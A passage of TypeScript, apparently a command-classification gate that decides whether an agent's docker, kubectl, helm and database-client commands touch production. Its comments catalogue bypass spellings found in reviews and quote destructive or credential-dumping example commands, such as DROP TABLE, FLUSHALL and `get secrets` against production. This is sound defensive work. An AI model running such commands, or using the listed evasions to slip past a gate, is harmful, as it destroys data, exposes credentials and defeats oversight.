  const sysConn = tokens.findIndex((t, i) => /^(add|default)$/.test(t) && tokens[i - 1] === 'connection');
  if (sysConn > 0) for (const t of tokens.slice(sysConn + 1)) if (!t.startsWith('-')) add(t, 'podman connection');
  const bxCreate = tokens.findIndex((t, i) => t === 'create' && tokens[i - 1] === 'buildx');
  if (bxCreate > 0) {
    const driver = tokens.findIndex((t, i) => t === '--driver' && i > bxCreate);
    if (driver > 0 && /^(remote|kubernetes)$/.test(tokens[driver + 1] ?? '')) {
      const endpoint = tokens.slice(driver + 2).find((t) => !t.startsWith('-'));
      add(endpoint ?? 'an unnamed remote endpoint', 'buildx driver');
    }
  }
  const bxUse = tokens.findIndex((t, i) => t === 'use' && tokens[i - 1] === 'buildx');
  if (bxUse > 0) {
    const name = tokens.slice(bxUse + 1).find((t) => !t.startsWith('-'));
    if (name) add(name, 'buildx use');
  }
  if (!signals.length) return { cls: 'LOCAL', target: 'local daemon', mutating: false };
  // A READ against another engine is not a mutation of it: `docker -H … ps` lists, it does not deploy. But a
  // MANAGEMENT GROUP is not a verb — `image` and `context` name a whole family whose members mutate, so treating
  // the group as a read let `docker --context production image rm|prune|load` reach ALLOW against a production
  // engine (exit review 4). When the first positional is a group, the verb is the pair.
  // `inspect` and `logs` PRINT the container's configuration and output — its environment variables, its mounts
  // and whatever it logged, which is where credentials live. Against a non-local engine that is an act on it,
  // exactly as `kubectl get secrets` is against a cluster (exit review 8).
  const reads = new Set(['ps', 'images', 'version', 'info', 'top', 'port', 'stats', 'events', 'history', 'diff', 'search']);
  const groupReads = new Set([
    // TWO PARALLEL TABLES THAT DISAGREED. Exit review 8 removed `inspect` and `logs` from the one-word `reads`
    // set — reading a production container's logs or its full configuration is an act against that host — and
    // left the `<group> <verb>` twins here, so `docker --context production container logs app` was ALLOW while
    // `docker --context production logs app` was not (exit review 10). The same defect as the env-inject list
    // having two copies: one statement, expressed twice, drifting apart.
    ...['image ls', 'image history', 'image save', 'image tree'],
    // `compose version` and `compose ls` print the plugin's version and the project list: no container is touched
    ...['compose version', 'compose ls'],
    ...['container ls', 'container port', 'container stats', 'container top', 'container diff'],
    // `inspect` and `logs` are NOT here for ANY group (exit review 10, self-attack): a service spec, a config payload, a
    // secret's metadata, a volume's options and a compose project's output are the same credentials-and-mounts the
    // one-word `inspect`/`logs` print, and listing only the ones someone remembered left their twins ALLOW
    ...['volume ls', 'network ls', 'system info', 'system df', 'system events'],
    ...['context ls', 'context inspect', 'context show', 'builder ls', 'buildx ls'],
    ...['node ls', 'service ls', 'service ps'],
    ...['stack ls', 'stack ps', 'stack services', 'secret ls', 'config ls'],
    ...['plugin ls', 'compose ls', 'compose ps', 'compose images', 'compose top'],
  ]);
  const groups = new Set(['image', 'container', 'volume', 'network', 'system', 'context', 'builder', 'buildx', 'node', 'service', 'stack', 'secret', 'config', 'plugin', 'trust', 'swarm', 'compose', 'manifest', 'checkpoint']);
  // A SIGNAL'S TARGET IS A VALUE, NOT A SUFFIX. The filter dropped every positional that the target string
  // merely ENDS WITH, so `docker --context staging-run run -d …` lost its own verb — `context staging-run`
  // ends with `run` — and a container started on a non-local engine reached ALLOW (exit review 7).
  const signalValues = new Set(signals.map((g) => g.target.slice(g.target.indexOf(' ') + 1)));
  const positional = tokens.slice(1).filter((t) => !t.startsWith('-') && !signalValues.has(t));
  const first = positional[0];
  const verb = first !== undefined && groups.has(first) && positional[1] !== undefined ? `${first} ${positional[1]}` : first;
  const isUse =
    tokens.some((t, i) => t === 'use' && tokens[i - 1] === 'context') ||
    bxUse > 0 ||
    bxCreate > 0 ||
    sysConn > 0;
  const mutating = isUse || verb === undefined || !(reads.has(verb) || groupReads.has(verb));
  const worst = signals.reduce((a, b) => (TARGET_SEVERITY[b.cls] > TARGET_SEVERITY[a.cls] ? b : a));
  return { ...worst, mutating };
}

function resolveK8sTarget(
  tokens: string[],
  targets: LocalTargets,
  /** THE SEGMENT AS WRITTEN. A probe flag inside a quoted VALUE is not a probe, and normalization has already
   *  dropped the quoting that says so: `helm uninstall app --description 'run --help first'` reaches the token
   *  scan as three bare words, one of which is `--help` (exit review 10). */
  rawSeg?: string,
): { cls: TargetClass; target: string; mutating: boolean } {
  const head = tokens[0] ?? '';
  if (/^(kind|k3d|minikube)$/.test(head)) return { cls: 'LOCAL', target: head, mutating: true };
  // `kustomize build|cfg|fn` RENDERS: it reads kustomization.yaml and writes YAML to stdout, opening no
  // kubeconfig and contacting no cluster, so there is no target to be unclassified about (exit review 7)
  if (head === 'kustomize' && /^(build|cfg|fn|version|edit)$/.test(tokens[1] ?? ''))
    return { cls: 'LOCAL', target: 'a local render', mutating: false };
  // The verb is found BY NAME, not by skipping option values: any global option missing from a skip-list would
  // otherwise displace it and silently turn a mutation into a read (round 14).
  const known = head === 'helm' ? HELM_VERBS : KUBECTL_VERBS;
  // READING A PRODUCTION CLUSTER'S SECRETS IS NOT A READ THIS MODEL MAY WAVE THROUGH. The target model escalates
  // only MUTATING verbs, so `kubectl --context production get secrets -o yaml` — a full credential dump — reached
  // ALLOW under a capability named k8s.local.apply (exit review 6). A secret is the one resource whose READ is an
  // effect on its own.
  // `secrets/db` is `TYPE/NAME` exactly as `secret/db` is, and only the singular slash form was listed, so
  // `kubectl --context production get secrets/db -o yaml` dumped a production Secret's data block at ALLOW
  // (exit review 7).
  const touchesSecrets =
    // kubectl accepts a COMMA-SEPARATED resource list: `get secrets,configmaps` reads both (exit review 8)
    (head === 'kubectl' && tokens.some((t) => t.split(',').some((r) => /^secrets?(\/.+)?$/i.test(r)))) ||
    // `helm get values|all|manifest|notes|hooks` PRINTS THE RENDERED RELEASE, which carries whatever the chart
    // templated — database URLs, tokens, the contents of every Secret it defines. Against a production cluster
    // that is a credential dump, exactly as `kubectl get secrets` is, and it was ALLOW because `get` is a read
    // verb and the target model escalates only mutations (exit review 7).
    (head === 'helm' && tokens.includes('get') && tokens.some((t) => /^(values|all|manifest|notes|hooks)$/.test(t)));
  const mutate = head === 'helm' ? HELM_MUTATING_VERBS : K8S_MUTATING_VERBS;
  let verb: string | undefined;
  let verbAt = -1;
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    if (t.startsWith('-')) {
      if (K8S_VALUE_OPTS.test(t)) i++; // its value is a namespace/context/file, never the verb
      continue;
    }
    if (known.has(t)) {
      verb = t;
      verbAt = i;
      break;
    }
  }
  // an unrecognised verb fails closed: the kernel cannot show it is a read. And `config use-context` is not a
  // read of anything — it re-points every LATER command at that cluster, which is the effect that matters.
  const switchesContext = tokens.some((t, i) => t === 'use-context' && tokens[i - 1] === 'config');
  // READING A CLUSTER'S SECRETS IS AN EFFECT ON ITS OWN. The target model escalates only MUTATING verbs, so
  // `kubectl --context production get secrets -o yaml` — a full credential dump from a production cluster —
  // reached ALLOW under a capability literally named k8s.local.apply (exit review 6). A secret is the one
  // resource whose READ has to be treated as an act against the cluster it is read from.
  // A VERB IS NOT A MUTATION IN EVERY SUBCOMMAND IT SPELLS: `rollout status` reports and `auth can-i` answers a
  // question. And a PROBE connects to nothing while a DRY RUN performs the act's checks and not the act — both
  // were absolute denies against a production cluster, which is a refusal to LOOK (exit review 9).
  const line = rawSeg ?? requote(tokens);
  // THE VERB'S POSITION IS THE ONE THE SCAN FOUND, not the first token that spells it. `kubectl --context
  // production -n auth auth can-i create pods` has `auth` as the NAMESPACE first, so `indexOf` pointed at the
  // option's value and the subcommand read as `auth` instead of `can-i` (self-attack on exit review 9).
  const sub = tokens[verbAt + 1];
  const readsOnly =
    (verb !== undefined && sub !== undefined && (K8S_READ_SUBCOMMANDS[verb]?.has(sub) ?? false)) ||
    // `kubectl set env … --list` PRINTS the environment and sets nothing
    (verb === 'set' &&
      tokens[tokens.length - 1] === '--list' &&
      !(tokens[tokens.length - 2] ?? '-').startsWith('-') &&
      !tokens.includes('--'));
  const mutating =
    switchesContext || touchesSecrets
      ? true
      : verb === undefined
        ? !isProbeInvocation(line)
        : mutate.has(verb) && !readsOnly && !isProbeInvocation(line) && !isDryRun(line);
  // EVERY signal that can select the cluster is classified, and the MOST RESTRICTIVE one decides. kubectl resolves
  // them together — `--server` overrides the context's endpoint and `--kubeconfig` chooses the file the context is
  // looked up in — so a local-looking `--context` must never end the search (round 14).
  const signals: Array<{ cls: TargetClass; target: string }> = [];
  const add = (values: string[], patterns: string[], kind: string) => {
    for (const v of values) signals.push({ cls: classifyTargetName(v, patterns, targets), target: `${kind} ${v}` });
  };
  // `kubectl config use-context X` re-points every later command at that cluster, exactly as `docker context
  // use` does — and that one was already classified (exit review 3).
  const useIdx = tokens.findIndex((t, i) => t === 'use-context' && tokens[i - 1] === 'config');
  if (useIdx > 0 && tokens[useIdx + 1]) add([tokens[useIdx + 1]!], k8sContexts(targets), 'context use');
  add(optionValues(tokens, '', ['--context', '--kube-context']), k8sContexts(targets), 'context');
  // A NAMED LOCAL CONTEXT IS DECISIVE. `kind get kubeconfig > ./kube.conf` then `kubectl --kubeconfig ./kube.conf
  // --context kind-dev apply` is the documented kind workflow; the FILE is UNCLASSIFIED (the kernel cannot read
  // it) and outranked the context, so the whole local loop was DENIED (exit review 7). A kubeconfig says where
  // contexts are listed; the `--context` says which one is used, and when that one is local there is nothing
  // left for the file to change.
  const namedContext = optionValues(tokens, '', ['--context', '--kube-context']);
  const contextIsLocal =
    namedContext.length > 0 &&
    namedContext.every((c) => classifyTargetName(c, k8sContexts(targets), targets) === 'LOCAL') &&
    // ...and only for a kubeconfig the WORKSPACE owns. `kind get kubeconfig > ./kube.conf` writes it into the
    // checkout; a file somewhere else is one the kernel cannot read and did not see created, and a pinned
    // bypass rests on exactly that (`--kubeconfig /tmp/remote.yaml --context kind-dev`, round 14).
    optionValues(tokens, '', ['--kubeconfig']).every((f) => !isAbsolute(f) && !f.startsWith('~'));
  // a kubeconfig FILE is unreadable to the kernel, so it is UNCLASSIFIED — unless the `--context` already names a
  // local cluster, in which case the file only says where that name is listed
  if (!contextIsLocal) add(optionValues(tokens, '', ['--kubeconfig']), [], 'kubeconfig');
  for (const t of tokens) {
    const env = /^(KUBECONFIG|KUBERNETES_MASTER)=(.+)$/.exec(t);
    if (env) signals.push({ cls: classifyTargetName(env[2]!, [], targets), target: env[1]! + '=' + env[2]! });
    // helm reads its context from the environment too, and `HELM_KUBECONTEXT=production helm upgrade` was a
    // production release nobody saw (exit review 7)
    const ctxEnv = /^(HELM_KUBECONTEXT|KUBE_CONTEXT|HELM_KUBEAPISERVER)=(.+)$/.exec(t);
    if (ctxEnv)
      signals.push({
        cls: classifyTargetName(ctxEnv[2]!, k8sContexts(targets), targets),
        target: `${ctxEnv[1]!}=${ctxEnv[2]!}`,
      });
  }
  // THE API SERVER IS AN ENDPOINT, so its HOST is what decides — `--server https://127.0.0.1:6443` names the
  // loopback cluster explicitly and was read as an opaque name, denying the very thing the local list exists to
  // allow (exit review 7).
  for (const v of optionValues(tokens, 's', ['--server', '--kube-apiserver'])) {
    const host = endpointHost(v);
    signals.push({
      cls: classifyTargetName(host, targets.dbLocalHosts, targets),
      target: `server ${v}`,
    });
  }
  for (const ns of optionValues(tokens, 'n', ['--namespace']))
    if (!isOpaqueTarget(ns) && hasProductionMarker(ns, targets.productionMarkers))
      signals.push({ cls: 'PRODUCTION', target: `namespace ${ns}` });
  if (signals.length === 0)
    return { cls: 'UNCLASSIFIED', target: 'the ambient kubeconfig context', mutating };
  const worst = signals.reduce((a, b) => (TARGET_SEVERITY[b.cls] > TARGET_SEVERITY[a.cls] ? b : a));
  return { cls: worst.cls, target: worst.target, mutating };
}

/** Resolves the database target of a normalized segment and whether a statement is executed against it. */
/** Bind-mount sources of a container run: `-v SRC:DST`, `--volume SRC:DST`, `--mount type=bind,source=SRC,...`.
 *  Handing a host path to a container reads and writes it, so the source is classified like any other path. */
export function containerMountSources(tokens: string[]): string[] {
  const out: string[] = [];
  for (const v of optionValues(tokens, 'v', ['--volume'])) {
    const src = v.split(':')[0];
    if (src && (src.startsWith('/') || src.startsWith('~') || src.startsWith('.') || src.startsWith('$')))
      out.push(src);
  }
  for (const m of tokens.join(' ').matchAll(/--mount[= ]\s*([^\s]+)/g)) {
    const spec = m[1]!;
    // A "VOLUME" WITH A DEVICE IS A BIND MOUNT WEARING A DIFFERENT WORD. The local volume driver takes the same
    // options `mount(8)` does, so `type=volume,volume-driver=local,volume-opt=type=none,volume-opt=device=/Users/…,
    // volume-opt=o=bind` hands the container that host directory exactly as `type=bind,source=…` would — and it
    // was not a bind mount by spelling, so the source was never judged (exit review 8).
    if (/type=bind/.test(spec)) {
      const src = /(?:^|,)(?:source|src)=([^,\s]+)/.exec(spec)?.[1];
      if (src) out.push(src);
      continue;
    }
    if (!/(?:^|,)volume-opt=device=/.test(spec)) continue;
    const dev = /(?:^|,)volume-opt=device=([^,\s]+)/.exec(spec)?.[1];
    // a device that is a PATH is a host directory; a real block device is the privileged class, not this one
    if (dev && /^(~|\.\.?)?\//.test(dev) && !/^\/dev\//.test(dev)) out.push(dev);
  }
  return out;
}

/** A word that can only be a connection target: a URI, or a host-shaped name with a path or a port. SQL words
 *  and table names never look like this, which is what lets the statement scan stop at one. */
function looksLikeDbTarget(t: string): boolean {
  if (/^[a-z][a-z0-9+.-]*:\/\//i.test(t)) return true;
  // A HOST AND A PORT IS A CONNECTION TARGET EVEN WITH NO DOT IN IT. `mongosh prod-mongo:27017 --eval …` names
  // a server by its bare service name, which is how every container network and every Kubernetes service is
  // addressed; requiring a dot or a slash made it an ordinary word and the production database was ALLOW
  // (exit review 9). A PORT is what distinguishes it from a database name or a SQL word.
  // ...but a PORT is only a port in a TARGET position. `redis-cli --scan --pattern session:2024` names a key
  // pattern, and reading it as a host with a port made the most ordinary redis inspection an absolute deny
  // (self-attack on exit review 9). A real port is at most 65535, and a year is not one — but the honest
  // distinction is the POSITION, which the caller knows and this predicate does not, so only the port RANGE is
  // checked here and the caller skips option values.
  if (/^[A-Za-z0-9][A-Za-z0-9._-]*:\d{1,5}(\/[A-Za-z0-9._-]*)?$/.test(t)) {
    const port = Number(/:(\d{1,5})/.exec(t)?.[1] ?? '0');
    return port > 0 && port <= 65535;
  }
  // `prod-mongo/admin` is `host/database` with no dot in it at all, which is how mongosh is normally invoked
  if (/^[A-Za-z0-9][A-Za-z0-9._-]*(:\d+)?\/[A-Za-z0-9._-]+$/.test(t) && !/\.(sql|js|py|rb|json|txt|sh)$/i.test(t))
    return true;
  return /^[A-Za-z0-9][A-Za-z0-9.-]*\.[A-Za-z][A-Za-z0-9-]*(:\d+)?(\/\S*)?$/.test(t) && !/\.(sql|js|py|rb|json|txt)$/i.test(t);
}

/** Every statement a database client will RUN, from any flag it accepts - including the abbreviations its option
 *  parser accepts (`mysql --exe`, `psql --comm`) - and whether any came from a FILE, which nobody has read. */
function dbStatements(tokens: string[]): { statements: string[]; fromFile: boolean } {
  const LONGS = ['command', 'execute', 'eval', 'query', 'init-command', 'defaults-command', 'file', 'init-file', 'queries-file', 'execute-file'];
  const FILES = new Set(['file', 'init-file', 'queries-file', 'execute-file']);
  const statements: string[] = [];
  let fromFile = false;
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    if (t.startsWith('--') && t.length > 3) {
      const eq = t.indexOf('=');
      const name = t.slice(2, eq < 0 ? undefined : eq);
      // an EXACT name is never ambiguous: `--execute` is not an abbreviation of `--execute-file`
      const hit = LONGS.includes(name) ? [name] : LONGS.filter((l) => l.startsWith(name));
      if (hit.length) {
        // an ambiguous abbreviation is refused by the client, so ANY candidate that reads a file counts as one
        const value = eq >= 0 ? t.slice(eq + 1) : tokens[i + 1];
        if (hit.some((l) => FILES.has(l))) fromFile = true;
        if (hit.some((l) => !FILES.has(l)) && value !== undefined) statements.push(value);
        if (eq < 0) i++;
        continue;
      }
    }
  }
  statements.push(...optionValues(tokens, 'c', []), ...optionValues(tokens, 'e', []));
  if (optionValues(tokens, 'f', []).length) fromFile = true;
  // the Go-style single-dash spellings were normalised to the double-dash ones by the caller
  return { statements: [...new Set(statements)], fromFile };
}

/** A statement that is a READ of schema, plan or server state - by a strict grammar, not by the absence of words.
 *  A blocklist of write verbs is wrong by omission (`created_at` contains `create`; `\g` ends a statement in mysql
 *  without a semicolon), so what is accepted is described positively and everything else is not a read. */
function isReadStatement(q: string): boolean {
  const s0 = q.trim().replace(/;\s*$/, '');
  if (s0 === '' || /;/.test(s0)) return false;
  // psql metacommands: the whole statement, one optional argument, nothing that chains (`\g`, `\gexec`, `\;`, `\!`)
  if (s0.startsWith('\\')) return /^\\(?:d[a-zA-Z+]{0,3}|l\+?|z|sf|ef|conninfo)(?:\s+[\w."*?$-]+)?$/.test(s0);
  // nothing else may carry a backslash: mysql's `\g`, `\G`, `\!` and `\.` send, run a shell or source a file
  if (/\\/.test(s0)) return false;
  if (/^show\s+[\w\s.,'"%=-]+$/i.test(s0)) return true;
  // DESCRIBE takes a table and, at most, one column; `DESCRIBE ANALYZE <select>` runs the select
  const d = /^(?:describe|desc)\s+([\w.`"]+)(?:\s+([\w`"%]+))?$/i.exec(s0);
  if (d) return !/^(analy[sz]e|format|extended|partitions)$/i.test(d[2] ?? '') || d[2] === undefined;
  // EXPLAIN prints a plan and runs nothing - unless ANALYZE, in any spelling and any option list, says otherwise
  if (/^explain\b/i.test(s0)) return !/analy[sz]e/i.test(s0) && !/^explain\s*\(/i.test(s0);
  return false;
}

/** redis' INFO, PING, DBSIZE and TTL read server state rather than data - and only when every option on the line is
 *  one whose meaning is known, since a mode flag (`--eval`, `--pipe`, `--scan`, `-x`) makes the first bare word
 *  something else. `redis-cli -c DEL k` has `-c` (cluster mode) and DELETES. */
function redisReadOnly(tokens: string[]): boolean {
  const VALUE = /^(-h|-p|-a|-n|-u|-s|-r|-i|-d|-D|--user|--pass|--sni|--cacert|--cacertdir|--cert|--key|--tls-ciphers|--tls-ciphersuites)$/;
  const BOOL = /^(-c|-e|-2|-3|-4|-6|--tls|--askpass|--no-auth-warning|--insecure|--raw|--no-raw|--csv|--json|--quoted-json)$/;
  const bare: string[] = [];
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    if (!t.startsWith('-')) {
      bare.push(t);
      continue;
    }
    if (VALUE.test(t)) i++;
    else if (BOOL.test(t) || (t.includes('=') && VALUE.test(t.slice(0, t.indexOf('='))))) continue;
    else return false;
  }
  return /^(info|ping|dbsize|time|lastsave|ttl|pttl|type|exists|strlen|llen|scard|hlen|zcard)$/i.test(bare[0] ?? '');
}

function resolveDbTarget(
  tokens: string[],
  targets: LocalTargets,
  envInputs: Record<string, string> = {},
  rawSeg?: string,
): { cls: TargetClass; target: string; executes: boolean } {
  const head = tokens[0] ?? '';
  // Whether a statement is "executed" is not guessed any more. A client pointed at a non-local database is an
  // external effect whatever it then types: the statement can arrive by flag, by positional argument, by file, by
  // stdin redirect, or interactively (round 14 found all five spellings escaping the flag test).
  // TWO EXCEPTIONS, AND ONLY TWO. A PROBE connects to nothing: `PGHOST=prod-db.acme.com psql --version` prints a
  // version string and exits, and it was an absolute deny against a database it never opens. And a statement
  // that is ENTIRELY read-only is a read: `psql -h prod-db -U ro -c 'EXPLAIN SELECT …'` is how an operator
  // inspects a plan, and refusing it absolutely leaves no way to look (exit review 9). The statement must be
  // wholly read-only — one write clause anywhere in it and the whole thing acts.
  const line = rawSeg ?? requote(tokens);
  // read from the RAW segment when there is one: there the statement is still the single quoted word it was
  // written as, so a `;` inside it is visible and the whole statement can be judged
  // `-e` IS mysql's SHORT `--execute`, and only `-c` was read as a short statement flag — so every read-only
  // statement spelled the mysql way was judged as an unrestricted connection (self-attack on exit review 9).
  // A GO-STYLE SINGLE-DASH LONG OPTION IS NOT A CLUSTER. influx spells it `-execute`, and the short-flag scan read it
  // as `-e -x -e -c ute` and pulled a statement called `ute` out of it - so the read-only test failed on a
  // statement the operator never wrote (exit review 10). Written with the double dash the scan cannot misread it.
  const stmtTokens = (rawSeg === undefined ? tokens : tokenizeMarked(rawSeg).map((t) => t.text)).map((t) =>
    /^-(execute|eval|query|command|init-command|init-file)(=|$)/.test(t) ? `-${t}` : t,
  );
  // `--init-command` RUNS BEFORE EVERYTHING ELSE, so a read-only `-e` says nothing about what the session does:
  // `mysql -h prod-db --init-command="DROP TABLE users" -e "SHOW TABLES"` drops the table and then lists
  // (exit review 10). Every statement the client will run is collected, and the exception needs ALL of them to
  // be read-only.
  const { statements, fromFile } = dbStatements(stmtTokens);
  const readOnlyStatement =
    statements.length > 0 && !fromFile && statements.every((q) => isReadStatement(q));
  // psql's `-l` LISTS THE DATABASES and connects to run nothing else - and only when it is a FLAG: in `psql -U -l -c
  // 'drop table t'` the `-l` is the user NAME, and a statement anywhere on the line makes the exception moot
  const PSQL_VALUE_SHORT = /^-[cdfFhLoPpRTUv]$/;
  const listsOnly =
    head === 'psql' &&
    statements.length === 0 &&
    !fromFile &&
    tokens.some((t, i) => (t === '-l' || t === '--list') && !(i > 0 && PSQL_VALUE_SHORT.test(tokens[i - 1] ?? '')));
  const redisRead = /^(redis-cli|valkey-cli)$/.test(head) && redisReadOnly(tokens);
  const executes = !isProbeInvocation(line) && !readOnlyStatement && !listsOnly && !redisRead;
  // sqlite3 operates on a file: the path rules already govern it
  if (head === 'sqlite3') return { cls: 'LOCAL', target: tokens[1] ?? '(memory)', executes };
  const signals: Array<{ cls: TargetClass; target: string }> = [];
  const push = (v: string, kind: string) => {
    // A HOST THAT IS A PATH IS A UNIX-DOMAIN SOCKET DIRECTORY, not a network host. libpq, mysql and their kin
    // read `-h /tmp` as "connect through the socket in /tmp" — the most local connection there is, and the only
    // one that cannot leave the machine. Classified as a NAME it was an EXTERNAL host, absolutely denied, and no
    // entry in `local-targets.md` could ever have named it (exit review 8).
    if (/^(~|\.\.?)?\//.test(v)) {
      signals.push({ cls: 'LOCAL', target: `${kind} ${v} (unix socket directory)` });
      return;
    }
    // ...and a host written as a URL is its HOSTNAME. `influx --host http://localhost:8086` is localhost; read
    // whole, the scheme and port made the string match no local pattern and the local dev server was denied.
    const name = /^[a-z][a-z0-9+.-]*:\/\//i.test(v) ? endpointHost(v) : v;
    signals.push({ cls: classifyTargetName(name, targets.dbLocalHosts, targets), target: `${kind} ${v}` });
  };

  // THE CLIENT READS THE ENVIRONMENT WHEN NO HOST IS ON THE LINE. libpq reads `PGHOST`, mysql reads `MYSQL_HOST`,
  // redis-cli reads `REDIS_HOST`; with none of them the client uses the local socket, which is why "no host
  // token" returned LOCAL. `resolveContainerTarget` and `resolveCloudTarget` both take `envInputs` for exactly
  // this reason and this one did not, so a production host named only in the environment was read as the local
  // socket (exit review 7).
  for (const [k, v] of Object.entries(envInputs))
    if (/^(PGHOST|PGHOSTADDR|MYSQL_HOST|REDIS_HOST|CLICKHOUSE_HOST|KUBERNETES_MASTER)$/.test(k)) push(v, `${k}=`);
    else if (/^(PGURI|REDIS_URL|MONGODB_URI|MONGO_URL|DATABASE_URL|FLYWAY_URL)$/.test(k))
      push(endpointHost(v.replace(/^jdbc:/, '')), `${k}=`);
    else if (k === 'PGSERVICE') signals.push({ cls: 'UNCLASSIFIED', target: `PGSERVICE=${v}` });

  // `\c [DBNAME [USER [HOST [PORT]]]]` RECONNECTS THE SESSION, so everything after it runs on that host. The
  // host is a WORD INSIDE a `-c` value, not a token of the command line, and only the short `\c - - HOST` form
  // happened to work — because there the host is also the value's last word, which the bare-token scan below
  // reaches. The fully spelled form put a database and a user in front of it and escaped (exit review 7).
  // the backslash is consumed by tokenization (it is an escape wherever the shell did not keep it), so the
  // meta-command survives as the bare word `c`/`connect` immediately after psql's `-c`
  // ...and the meta-command may live INSIDE one token, which is what a script read from standard input looks
  // like once it is handed over as a single word (exit review 8)
  for (const t of tokens) {
    // the backslash is consumed by tokenization wherever the shell did not keep it, so the meta-command may
    // survive as a bare `c`/`connect` at the start of a line of the script
    const inTok = /(?:^|\n)\s*\\?c(?:onnect)?\s+(\S+)(?:\s+(\S+))?(?:\s+(\S+))?/.exec(t);
    if (inTok?.[3] && inTok[3] !== '-') push(inTok[3], '\\connect host');
  }
  // `\c` may arrive as psql's `-c` VALUE, or as a line of the script the client reads from standard input — in
  // which case its predecessor is whatever came before it in the SQL (exit review 8). The backslash is consumed
  // by tokenization wherever the shell did not keep it, so both spellings are accepted.
  const connAt = tokens.findIndex(
    (t, i) =>
      i > 0 &&
      /^\\?c(onnect)?$/.test(t) &&
      (/^(-c|--command|-f|--file)$/.test(tokens[i - 1] ?? '') || DB_CLIENT_HEADS.has(tokens[0] ?? '')),
  );
  if (connAt >= 0) {
    const words = tokens.slice(connAt + 1, connAt + 5);
    // `\c DBNAME USER HOST PORT`: the third word is the host, and `-` means "keep the current one"
    if (words[2] !== undefined && words[2] !== '-') push(words[2], '\\connect host');
  }

  for (const t of tokens) {
    // a URI anywhere in the token, not only at its start: `-url=jdbc:postgresql://prod-db/app` hid the host
    for (const m of t.matchAll(/[a-z][a-z0-9+.-]*:\/\/(?:[^@/\s]*@)?\[?([^\]:/?\s]+)\]?/gi)) {
      if (isOpaqueTarget(m[0]!)) signals.push({ cls: 'UNCLASSIFIED', target: m[0]! });
      else push(m[1] ?? '', 'uri host');
    }
    // A QUERY PARAMETER OVERRIDES THE URI HOST. libpq reads `postgres://localhost/app?host=prod-db.acme.com` and
    // connects to prod-db: the authority is ignored when `host=` is given, so reading only the authority let a
    // production database reach ALLOW (exit review 6).
    for (const m of t.matchAll(/[?&](host|hostaddr|server)=([^&\s"']+)/gi)) push(m[2]!, 'uri parameter host');
    // an environment variable that selects the server, re-attached by normalizeSegment
    const env = /^(PGHOST|PGHOSTADDR|MYSQL_HOST|REDIS_HOST|CLICKHOUSE_HOST)=(.+)$/.exec(t);
    if (env) push(env[2]!, env[1]! + '=');
    if (/^(PGSERVICE|PGURI|DATABASE_URL|REDIS_URL|MONGODB_URI|MONGO_URL)=/.test(t) && !/:\/\//.test(t))
      signals.push({ cls: 'UNCLASSIFIED', target: t.split('=')[0]! });
    // libpq / MySQL keyword-value conninfo: `psql "host=db.acme.com dbname=app"` names the host without a URI
    // A CONNINFO STRING IS A CONNINFO STRING WHEREVER IT SITS. The boundary required whitespace or a quote
    // before `host`, so `--dbname="host=prod-db.acme.com dbname=app"` — the glued form — never matched
    // (exit review 10). An `=` counts as a boundary too, and so does the start of an option's value.
    for (const m of t.matchAll(/(?:^|[\s"'=])host(?:addr)?\s*=\s*([^\s"';]+)/gi)) push(m[1]!, 'conninfo host');
    // ...AND libpq ALLOWS SPACES AROUND THE `=`. `psql "dbname = app host = prod-db.acme.com"` is one quoted
    // word to the shell and three tokens after normalization, so a per-token scan could never see the pair. The
    // RAW segment still has the quoting that says it is one word (exit review 10).
    if (rawSeg !== undefined)
      for (const m of rawSeg.matchAll(/(?:^|[\s"'=])host(?:addr)?\s*=\s*([^\s"';]+)/gi))
        push(m[1]!, 'conninfo host');
    // a service name resolves through a file the kernel cannot read: unknowable, so never local
    if (/(?:^|[\s"'])service\s*=/i.test(t) || t === '--service' || t.startsWith('--service='))
      signals.push({ cls: 'UNCLASSIFIED', target: 'a connection service name' });
    // A CONNECTION PROFILE named on the command line resolves through a client option file the kernel never reads
    // — `~/.my.cnf`, the obfuscated `~/.mylogin.cnf`, a cqlshrc. Same rule as `service=`: an EXPLICIT reference to
    // an unreadable profile is never local. The IMPLICIT default option file is deliberately NOT a signal, since
    // no evidence is on the command line and gating a bare `psql` would gate the ordinary inner loop.
    // ...in EVERY spelling a client uses for it: a migration runner writes it `-configFiles=`, `--defaultsFile=`
    // or `--url=@file`, and a single dash in front of a whole word is a long option (exit review 9)
    if (/^-{1,2}(defaults-file|defaults-extra-file|defaultsFile|login-path|defaults-group-suffix|cqlshrc|config-file|configFiles|config|conf|properties|env-file)(=|$)/i.test(t))
      signals.push({ cls: 'UNCLASSIFIED', target: 'a client connection profile' });
  }
  for (const h of optionValues(tokens, 'h', ['--host'])) push(h, 'host');
  // `redis-cli --cluster <subcommand> <host:port> …` names the node as a LATER positional — the bare-operand scan
  // below stops at the subcommand and never reaches it, so `--cluster call prod-cache-01:6379 FLUSHALL` was the
  // local socket (exit review 4). `--cluster` is matched EXACTLY, so `--cluster-mode` and the `--cluster-from`
  // family are untouched, and only a real `host:port` counts, so a key that contains a colon is not a host.
  if (/^(redis-cli|valkey-cli)$/.test(head.slice(head.lastIndexOf('/') + 1))) {
    const clusterAt = tokens.indexOf('--cluster');
    if (clusterAt >= 0)
      for (let i = clusterAt + 2; i < tokens.length; i++) {
        // The node list is CONTIGUOUS and ends at the first operand that is not a node; everything after it is
        // the redis COMMAND and its KEYS. Scanning to the end of the line instead read a key shaped `prod:1` as a
        // production node and turned an ordinary `--cluster call localhost:7000 SET prod:1 x` into an absolute
        // deny nobody could approve.
        if (!/^(\[[^\]\s]+\]|[A-Za-z0-9][A-Za-z0-9.-]*):\d+$/.test(tokens[i]!)) break;
        push(endpointHost(tokens[i]!), 'cluster node');
      }
  }
  // the first operand that is not an option NOR an option's value
  let bare: string | undefined;
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    if (t.startsWith('-')) {
      // THE STATEMENT IS ONE WORD, and the quoting that said so is gone by the time this scan runs. Skipping a
      // single token after `-c` left the rest of the SQL to be read as operands, so `psql -c 'select * from
      // users'` found the bare operand `*` and called the target unclassified — the most ordinary query there is,
      // against the local socket, interrupting the agent for approval (exit review 7). Everything up to the next
      // option belongs to the statement.
      if (/^(-c|--command|-e|--execute|--eval|--query)$/.test(t)) {
        // ...but it stops at a CONNECTION TARGET. The statement is one quoted word whose quoting is gone by
        // now, so the scan runs to the next option — and `mongosh --eval '…' prod-mongo.acme.com/app` puts the
        // host AFTER the statement, where the scan swallowed it (exit review 8).
